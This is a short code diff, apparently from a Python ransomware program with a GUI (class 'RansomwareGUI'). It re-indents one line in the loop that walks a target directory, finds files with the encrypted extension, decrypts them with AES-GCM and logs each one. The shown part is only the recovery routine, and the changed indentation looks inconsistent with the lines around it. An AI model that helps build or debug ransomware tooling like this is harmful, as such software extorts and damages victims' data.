@@ -471,7 +471,7 @@ class RansomwareGUI:
                 for root, _, files in os.walk(TARGET_DIRECTORY):
                     for file in files:
                             if file.endswith(ENCRYPTED_EXTENSION):
-                            file_path = os.path.join(root, file)
+                                file_path = os.path.join(root, file)
                             if decrypt_file_aes_gcm(file_path, key):
                                 decrypted_files += 1
                                 self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
